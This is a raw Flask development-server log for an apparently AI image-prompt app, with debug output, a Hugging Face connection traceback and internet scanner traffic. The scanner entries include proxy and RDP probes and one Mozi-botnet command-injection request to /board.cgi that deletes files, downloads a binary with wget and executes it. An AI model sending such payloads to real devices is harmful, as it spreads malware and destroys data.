 * Serving Flask app 'app'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8080
 * Running on http://172.16.0.88:8080
Press CTRL+C to quit
59.78.30.6 - - [07/Mar/2024 09:23:44] code 400, message Bad request version ('\x96cý\x01ü\x9bs\x903RK/\x9cðw<ço0\x0eQ\x19|Êê\x12Ôµ?µb\x8d\x00"\x13\x01\x13\x03\x13\x02À+À/Ì©Ì¨À,À0À')
59.78.30.6 - - [07/Mar/2024 09:23:44] "\x16\x03\x01\x02z\x01\x00\x02v\x03\x03<Í\x9a\x04û\x9fØ\x1d£\x1fùämT\x87Å«\x88ÁÞCÈcN (Âá\x8av­+ \x96cý\x01ü\x9bs\x903RK/\x9cðw<ço0\x0eQ\x19|Êê\x12Ôµ?µb\x8d\x00"\x13\x01\x13\x03\x13\x02À+À/Ì©Ì¨À,À0À" HTTPStatus.BAD_REQUEST -
[{'generated_text': 'A mountain in spring with white cloud, beautiful style, 8k, realistic, hyper detailed, symmetrical, octane render, by  Craig Mullins, by Johannes Vermeer::0.1 --ar 2:3 --stop 85'}]
A mountain in spring with white cloud, beautiful style, 8k, realistic, hyper detailed, symmetrical, octane render, by  Craig Mullins, by Johannes Vermeer::0.1 --ar 2:3 --stop 85
selected model stable_diffusion
True
10 7.5 1.5
file_name 4eae5b49-1ad3-479c-a824-a0aaa9ef7bb6.jpg
add a bird to the sky
get_pix2pix_result 1
get_pix2pix_result 2
get_pix2pix_result 3
tmp/4eae5b49-1ad3-479c-a824-a0aaa9ef7bb6.jpg
get_pix2pix_result 4
get_pix2pix_result 5
7.5
[<selenium.webdriver.remote.webelement.WebElement (session="2825bbd18c1b4666fb2f13a71770f925", element="f.241A13A368A418E9F49A71E387CFB5E1.d.C290C863174EE0D7D14A6A46FFB96AF1.e.41")>, <selenium.webdriver.remote.webelement.WebElement (session="2825bbd18c1b4666fb2f13a71770f925", element="f.241A13A368A418E9F49A71E387CFB5E1.d.C290C863174EE0D7D14A6A46FFB96AF1.e.68")>, <selenium.webdriver.remote.webelement.WebElement (session="2825bbd18c1b4666fb2f13a71770f925", element="f.241A13A368A418E9F49A71E387CFB5E1.d.C290C863174EE0D7D14A6A46FFB96AF1.e.73")>, <selenium.webdriver.remote.webelement.WebElement (session="2825bbd18c1b4666fb2f13a71770f925", element="f.241A13A368A418E9F49A71E387CFB5E1.d.C290C863174EE0D7D14A6A46FFB96AF1.e.78")>, <selenium.webdriver.remote.webelement.WebElement (session="2825bbd18c1b4666fb2f13a71770f925", element="f.241A13A368A418E9F49A71E387CFB5E1.d.C290C863174EE0D7D14A6A46FFB96AF1.e.81")>]
get_pix2pix_result 6
get_pix2pix_result 7
get_pix2pix_result 8
Element not found, attempt 1...
Element not found, attempt 2...
Element not found, attempt 3...
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
ImmutableMultiDict([('query', ''), ('model', 'stable_diffusion')])
[{'generated_text': 'A mountain in spring with white cloud, mountain in autumn with white sky'}]
A mountain in spring with white cloud, mountain in autumn with white sky
selected model stable_diffusion
True
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
mountain, landscape, sunset, mountains, sky, nature, sunrise, fog, morning, sun, cloud, mist, view, dawn, forest, clouds, hill, summer, valley, lake, range, horizon, silhouette, travel, vector --s 50
None
None
None
None
None
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
None
None
None
None
None
A mountain in spring with white cloud
ImmutableMultiDict([('query', ''), ('model', 'stable_diffusion')])
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
A mountain in spring with white cloud
78.108.177.52 - - [08/Mar/2024 05:18:06] "GET / HTTP/1.0" 200 -
94.156.8.35 - - [08/Mar/2024 05:24:08] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
94.156.8.2 - - [08/Mar/2024 05:33:32] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
205.210.31.255 - - [08/Mar/2024 06:13:50] code 400, message Bad request version ('\x18\x89')
205.210.31.255 - - [08/Mar/2024 06:13:50] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03¤¿Û^{ê²ÇH\x11\x0c\x85üêpÿ(¨@8S\x02ÊÃU[;\x9e\x98ðcû «®Ì,ÏCztñ>¶{6\x85\x18\x89" HTTPStatus.BAD_REQUEST -
205.210.31.255 - - [08/Mar/2024 06:13:51] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03f·z\x89\x9ds\x8e\x06r7¨\x81H«*ÂC2á\x04Þ\x02Ý1\x05,ÌAð|¡B\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
205.210.31.255 - - [08/Mar/2024 06:13:51] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03f·z\x89\x9ds\x8e\x06r7¨\x81H«*ÂC2á\x04Þ\x02Ý1\x05,ÌAð|¡B\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
64.62.197.135 - - [08/Mar/2024 06:17:50] "GET / HTTP/1.1" 200 -
64.62.197.124 - - [08/Mar/2024 06:18:02] "GET /favicon.ico HTTP/1.1" 404 -
64.62.197.128 - - [08/Mar/2024 06:18:17] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 -
64.62.197.126 - - [08/Mar/2024 06:18:27] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
146.19.24.28 - - [08/Mar/2024 08:27:18] "GET / HTTP/1.1" 200 -
172.104.210.105 - - [08/Mar/2024 09:05:49] "GET / HTTP/1.1" 200 -
45.79.181.104 - - [08/Mar/2024 09:06:15] "GET / HTTP/1.1" 200 -
198.74.56.46 - - [08/Mar/2024 09:48:12] "GET / HTTP/1.1" 200 -
172.104.11.46 - - [08/Mar/2024 09:48:48] "GET / HTTP/1.1" 200 -
146.19.24.28 - - [08/Mar/2024 09:50:08] "GET / HTTP/1.1" 200 -
185.150.26.251 - - [08/Mar/2024 10:12:01] "GET http://azenv.net/ HTTP/1.1" 200 -
185.36.81.40 - - [08/Mar/2024 10:19:32] "CONNECT google.com:443 HTTP/1.1" 404 -
185.150.26.251 - - [08/Mar/2024 10:36:50] "GET http://azenv.net/ HTTP/1.1" 200 -
38.34.178.127 - - [08/Mar/2024 11:19:12] "GET http://azenv.net/ HTTP/1.1" 200 -
205.210.31.166 - - [08/Mar/2024 11:45:10] "GET / HTTP/1.1" 200 -
146.19.24.28 - - [08/Mar/2024 12:03:15] "GET / HTTP/1.1" 200 -
91.92.251.254 - - [08/Mar/2024 12:14:44] "CONNECT 185.65.245.140:7227 HTTP/1.1" 404 -
184.105.247.200 - - [08/Mar/2024 12:18:42] "GET / HTTP/1.1" 200 -
184.105.247.236 - - [08/Mar/2024 12:19:17] "GET /favicon.ico HTTP/1.1" 404 -
184.105.247.232 - - [08/Mar/2024 12:19:45] "GET http://api.ipify.org/?format=json HTTP/1.1" 200 -
184.105.247.220 - - [08/Mar/2024 12:20:10] "CONNECT www.shadowserver.org:443 HTTP/1.1" 404 -
146.190.107.153 - - [08/Mar/2024 12:25:47] "CONNECT www.google.com:443 HTTP/1.1" 404 -
192.241.236.81 - - [08/Mar/2024 12:30:52] "GET / HTTP/1.1" 200 -
185.191.126.213 - - [08/Mar/2024 13:08:27] "GET / HTTP/1.1" 200 -
146.19.24.28 - - [08/Mar/2024 13:37:39] "GET / HTTP/1.1" 200 -
141.98.7.181 - - [08/Mar/2024 14:04:10] "GET /manager/html HTTP/1.1" 404 -
146.190.107.153 - - [08/Mar/2024 14:38:35] "CONNECT www.google.com:443 HTTP/1.1" 404 -
146.19.24.28 - - [08/Mar/2024 14:45:55] "GET / HTTP/1.1" 200 -
146.19.24.28 - - [08/Mar/2024 15:32:39] "GET / HTTP/1.1" 200 -
2.57.149.233 - - [08/Mar/2024 16:09:44] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
2.57.149.233 - - [08/Mar/2024 16:09:44] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
47.113.185.166 - - [08/Mar/2024 16:21:37] code 400, message Bad request version ('À\x14À')
47.113.185.166 - - [08/Mar/2024 16:21:37] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03~\x92\x0c\x93+ÉÕÏMqe\x80\x05\x8d»\x02Ê²Ã\x9fNNý\x08º>D\x9f\x06\x13,î ´m\x926G(\x8e\x03^ßÔ©ÆBåº5ÏÈÍF¥»¤ä\x87Á\x12«PÆ,\x00&Ì¨Ì©À/À0À+À,À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
78.128.114.22 - - [08/Mar/2024 16:24:12] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
78.128.114.22 - - [08/Mar/2024 16:24:12] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
47.113.185.166 - - [08/Mar/2024 16:24:58] "GET / HTTP/1.1" 200 -
47.113.185.166 - - [08/Mar/2024 16:25:17] "GET /static/src/wand-magic-sparkles-solid.svg HTTP/1.1" 200 -
87.121.69.25 - - [08/Mar/2024 16:34:24] "CONNECT google.com:443 HTTP/1.1" 404 -
80.91.116.135 - - [08/Mar/2024 17:02:51] "GET / HTTP/1.1" 200 -
194.48.250.106 - - [08/Mar/2024 17:04:25] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
185.150.26.251 - - [08/Mar/2024 17:46:59] "GET http://azenv.net/ HTTP/1.1" 200 -
2.57.149.233 - - [08/Mar/2024 17:56:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
2.57.149.233 - - [08/Mar/2024 17:56:25] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
194.48.250.105 - - [08/Mar/2024 18:05:31] "CONNECT 45.61.136.175:7227 HTTP/1.1" 404 -
128.14.173.117 - - [08/Mar/2024 18:12:24] "GET / HTTP/1.1" 200 -
117.207.49.206 - - [08/Mar/2024 18:17:40] "GET / HTTP/1.1" 200 -
194.48.250.138 - - [08/Mar/2024 18:36:46] "CONNECT 193.149.189.126:7227 HTTP/1.1" 404 -
146.19.24.28 - - [08/Mar/2024 18:39:48] "GET / HTTP/1.1" 200 -
205.210.31.41 - - [08/Mar/2024 18:46:38] "GET / HTTP/1.1" 200 -
109.205.213.198 - - [08/Mar/2024 19:10:08] "GET / HTTP/1.1" 200 -
45.79.181.94 - - [08/Mar/2024 19:54:06] code 400, message Bad request version ('À\x14À')
45.79.181.94 - - [08/Mar/2024 19:54:06] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03v+¢Me;]/×m\x0cz\x95aÏøÜ\x03p$¥å!\x06LÜ\x8eë¸î¦\x9e\x00\x00 À/À0À+À,Ì¨Ì©À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
45.128.232.152 - - [08/Mar/2024 20:00:09] "CONNECT example.com:443 HTTP/1.1" 404 -
45.128.232.152 - - [08/Mar/2024 20:00:17] code 400, message Bad request syntax ('\x05\x01\x00')
45.128.232.152 - - [08/Mar/2024 20:00:17] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
45.128.232.152 - - [08/Mar/2024 20:00:26] code 400, message Bad request version ('À\x13À')
45.128.232.152 - - [08/Mar/2024 20:00:26] "\x16\x03\x01\x00ê\x01\x00\x00æ\x03\x03\x03©é<\x11Õ^]u\x06eÝ\x17$\x80{Áç\x96\x06\x1b\x13áB\x0d¸Ø>O´cÑ \x86îffÇ½¡Ã!(j×*\x7fcx2Jà\x1bìû°ß\x04È\x85w0Éô\x8c\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
198.235.24.231 - - [08/Mar/2024 20:03:42] code 400, message Bad request version ('À\x13À')
198.235.24.231 - - [08/Mar/2024 20:03:42] "\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03©ËºÉ\x99ÌµØjyU\x8dx¾>þñ\x18\x82ÐfO³½A-m¼Z\x0bnþ \x90\x12B\x13\x08j\x03\x0b\x06O\x10¿6 \x80áQ\x1f¨^¤¦A÷Îp\x02)48Sn\x00&À+À/À,À0Ì©Ì¨À\x09À\x13À" HTTPStatus.BAD_REQUEST -
198.235.24.231 - - [08/Mar/2024 20:03:42] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Mf\\.,ãÙqÐ]»\x93\x91\x19\x06\x9eJ8O÷ÕÅT\x97GÁ\x88*\x0f\x97°ò\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
198.235.24.231 - - [08/Mar/2024 20:03:42] "\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03Mf\\.,ãÙqÐ]»\x93\x91\x19\x06\x9eJ8O÷ÕÅT\x97GÁ\x88*\x0f\x97°ò\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À\x09À(À$À\x14À" HTTPStatus.BAD_REQUEST -
185.180.143.72 - - [08/Mar/2024 20:07:07] "GET / HTTP/1.1" 200 -
103.149.26.234 - - [08/Mar/2024 20:28:36] "GET / HTTP/1.1" 200 -
103.149.26.234 - - [08/Mar/2024 20:28:48] "GET /static/src/wand-magic-sparkles-solid.svg HTTP/1.1" 200 -
45.128.232.152 - - [08/Mar/2024 20:39:22] code 400, message Bad request syntax ('\x04\x01\x01»]¸Ø"\x00')
45.128.232.152 - - [08/Mar/2024 20:39:22] "\x04\x01\x01»]¸Ø"\x00" HTTPStatus.BAD_REQUEST -
185.36.81.40 - - [08/Mar/2024 20:57:34] "CONNECT google.com:443 HTTP/1.1" 404 -
151.247.3.143 - - [08/Mar/2024 21:52:19] "GET / HTTP/1.1" 200 -
107.170.240.16 - - [08/Mar/2024 21:59:27] code 400, message Bad request syntax ('MGLNDD_103.152.132.86_8080')
107.170.240.16 - - [08/Mar/2024 21:59:27] "MGLNDD_103.152.132.86_8080" HTTPStatus.BAD_REQUEST -
146.19.24.28 - - [08/Mar/2024 22:34:16] "GET / HTTP/1.1" 200 -
185.242.226.25 - - [08/Mar/2024 22:37:46] "GET / HTTP/1.1" 200 -
46.174.191.31 - - [08/Mar/2024 22:51:26] "GET / HTTP/1.0" 200 -
78.108.177.50 - - [08/Mar/2024 23:18:06] "GET / HTTP/1.0" 200 -
198.235.24.195 - - [08/Mar/2024 23:41:58] "GET / HTTP/1.1" 200 -
146.19.24.28 - - [09/Mar/2024 00:33:06] "GET / HTTP/1.1" 200 -
185.150.26.251 - - [09/Mar/2024 00:38:56] "GET http://azenv.net/ HTTP/1.1" 200 -
90.151.171.108 - - [09/Mar/2024 00:44:10] "CONNECT fingerprints.bablosoft.com:443 HTTP/1.1" 404 -
90.151.171.108 - - [09/Mar/2024 00:44:20] code 400, message Bad HTTP/0.9 request type ('\x04\x01\x00P¢\x13©')
90.151.171.108 - - [09/Mar/2024 00:44:20] "\x04\x01\x00P¢\x13©\x0b0\x00" HTTPStatus.BAD_REQUEST -
90.151.171.108 - - [09/Mar/2024 00:44:20] "GET http://fingerprints.bablosoft.com/ip?Z78958408371Q1 HTTP/1.1" 404 -
90.151.171.108 - - [09/Mar/2024 00:44:30] code 400, message Bad request syntax ('\x05\x01\x00')
90.151.171.108 - - [09/Mar/2024 00:44:30] "\x05\x01\x00" HTTPStatus.BAD_REQUEST -
117.251.167.33 - - [09/Mar/2024 01:51:25] "GET / HTTP/1.1" 200 -
38.34.178.127 - - [09/Mar/2024 02:22:42] "GET http://azenv.net/ HTTP/1.1" 200 -
162.142.125.220 - - [09/Mar/2024 02:47:18] "GET / HTTP/1.1" 200 -
162.142.125.220 - - [09/Mar/2024 02:47:24] "GET / HTTP/1.1" 200 -
162.142.125.220 - - [09/Mar/2024 02:47:25] code 505, message Invalid HTTP version (2.0)
162.142.125.220 - - [09/Mar/2024 02:47:25] "PRI * HTTP/2.0" HTTPStatus.HTTP_VERSION_NOT_SUPPORTED -
162.142.125.220 - - [09/Mar/2024 02:47:26] "GET /static/src/wand-magic-sparkles-solid.svg HTTP/1.1" 200 -
162.142.125.220 - - [09/Mar/2024 02:47:26] "GET /favicon.ico HTTP/1.1" 404 -
146.19.24.28 - - [09/Mar/2024 02:58:54] "GET / HTTP/1.1" 200 -
185.242.226.25 - - [09/Mar/2024 03:18:46] "GET /static/src/wand-magic-sparkles-solid.svg HTTP/1.1" 200 -
185.242.226.25 - - [09/Mar/2024 03:18:48] "GET / HTTP/1.1" 200 -
185.36.81.40 - - [09/Mar/2024 03:20:00] "CONNECT google.com:443 HTTP/1.1" 404 -
78.128.114.22 - - [09/Mar/2024 03:23:20] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
78.128.114.22 - - [09/Mar/2024 03:23:20] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
222.247.0.159 - - [09/Mar/2024 04:11:36] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/0.9" 404 -
38.34.178.127 - - [09/Mar/2024 04:34:29] "GET http://azenv.net/ HTTP/1.1" 200 -
205.210.31.93 - - [09/Mar/2024 04:54:13] "GET / HTTP/1.0" 200 -
178.159.37.98 - - [09/Mar/2024 05:04:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
178.159.37.98 - - [09/Mar/2024 05:04:07] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
38.34.178.127 - - [09/Mar/2024 05:15:49] "GET http://azenv.net/ HTTP/1.1" 200 -
38.34.178.127 - - [09/Mar/2024 05:32:05] "GET http://azenv.net/ HTTP/1.1" 200 -
185.216.71.4 - - [09/Mar/2024 05:35:52] "CONNECT pro.ip-api.com:443 HTTP/1.1" 404 -
185.216.71.4 - - [09/Mar/2024 05:35:53] code 400, message Bad request version (",Èûêw\x97\x9cã\x89Ä¥t,\x18Ñè(\x16¥XY-*·IÃlí{*\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ")
185.216.71.4 - - [09/Mar/2024 05:35:53] "\x16\x03\x01\x01)\x01\x00\x01%\x03\x03w¶[ä\x07çëâ¢)Pu;2nDã³T·Þ§qI?\x89\x02Ä´\x88«\x07 #\x85,Èûêw\x97\x9cã\x89Ä¥t,\x18Ñè(\x16¥XY-*·IÃlí{*\x00>\x13\x02\x13\x03\x13\x01À,À0\x00\x9fÌ©Ì¨ÌªÀ+À/\x00\x9eÀ$À(\x00kÀ#À'\x00gÀ" HTTPStatus.BAD_REQUEST -
185.224.128.251 - - [09/Mar/2024 05:48:17] "GET / HTTP/1.0" 200 -
146.19.24.28 - - [09/Mar/2024 06:09:05] "GET / HTTP/1.1" 200 -
38.34.178.127 - - [09/Mar/2024 06:32:26] "GET http://azenv.net/ HTTP/1.1" 200 -
79.124.49.202 - - [09/Mar/2024 06:54:27] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
79.124.49.202 - - [09/Mar/2024 06:54:27] "\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie: mstshash=Administr" HTTPStatus.BAD_REQUEST -
141.98.7.181 - - [09/Mar/2024 07:28:55] "GET /manager/html HTTP/1.1" 404 -
38.34.178.127 - - [09/Mar/2024 07:34:53] "GET http://azenv.net/ HTTP/1.1" 200 -
185.150.26.251 - - [09/Mar/2024 07:52:01] "GET http://azenv.net/ HTTP/1.1" 200 -
205.210.31.182 - - [09/Mar/2024 08:21:21] "GET / HTTP/1.1" 200 -
{"level":"info","ts":1709973678.126577,"msg":"using provided configuration","config_file":"./Caddyfile","config_adapter":""}
{"level":"warn","ts":1709973678.1286404,"msg":"Caddyfile input is not formatted; run 'caddy fmt --overwrite' to fix inconsistencies","adapter":"caddyfile","file":"./Caddyfile","line":2}
[2024-03-09 23:17:10,728] ERROR in app: Exception on /generate [POST]
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 169, in _new_conn
    conn = connection.create_connection(
  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):
  File "/usr/lib/python3.10/socket.py", line 955, in getaddrinfo
    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
socket.gaierror: [Errno -3] Temporary failure in name resolution

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 700, in urlopen
    httplib_response = self._make_request(
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 383, in _make_request
    self._validate_conn(conn)
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 1017, in _validate_conn
    conn.connect()
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 353, in connect
    conn = self._new_conn()
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 181, in _new_conn
    raise NewConnectionError(
urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPSConnection object at 0x7f38c86d9f00>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 439, in send
    resp = conn.urlopen(
  File "/usr/lib/python3/dist-packages/urllib3/connectionpool.py", line 756, in urlopen
    retries = retries.increment(
  File "/usr/lib/python3/dist-packages/urllib3/util/retry.py", line 574, in increment
    raise MaxRetryError(_pool, url, error or ResponseError(cause))
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='api-inference.huggingface.co', port=443): Max retries exceeded with url: /models/succinctly/text2image-prompt-generator (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f38c86d9f00>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/magicpromt/.local/lib/python3.10/site-packages/flask/app.py", line 1455, in wsgi_app
    response = self.full_dispatch_request()
  File "/home/magicpromt/.local/lib/python3.10/site-packages/flask/app.py", line 869, in full_dispatch_request
    rv = self.handle_user_exception(e)
  File "/home/magicpromt/.local/lib/python3.10/site-packages/flask/app.py", line 867, in full_dispatch_request
    rv = self.dispatch_request()
  File "/home/magicpromt/.local/lib/python3.10/site-packages/flask/app.py", line 852, in dispatch_request
    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
  File "/home/magicpromt/MagicPrompt/app.py", line 254, in generate
    generated_text = prompt_generator(query)
  File "/home/magicpromt/MagicPrompt/prompt_generator.py", line 9, in prompt_generator
    response = requests.post(API_URL, headers=headers, json=input)
  File "/usr/lib/python3/dist-packages/requests/api.py", line 119, in post
    return request('post', url, data=data, json=json, **kwargs)
  File "/usr/lib/python3/dist-packages/requests/api.py", line 61, in request
    return session.request(method=method, url=url, **kwargs)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 544, in request
    resp = self.send(prep, **send_kwargs)
  File "/usr/lib/python3/dist-packages/requests/sessions.py", line 657, in send
    r = adapter.send(request, **kwargs)
  File "/usr/lib/python3/dist-packages/requests/adapters.py", line 516, in send
    raise ConnectionError(e, request=request)
requests.exceptions.ConnectionError: HTTPSConnectionPool(host='api-inference.huggingface.co', port=443): Max retries exceeded with url: /models/succinctly/text2image-prompt-generator (Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f38c86d9f00>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
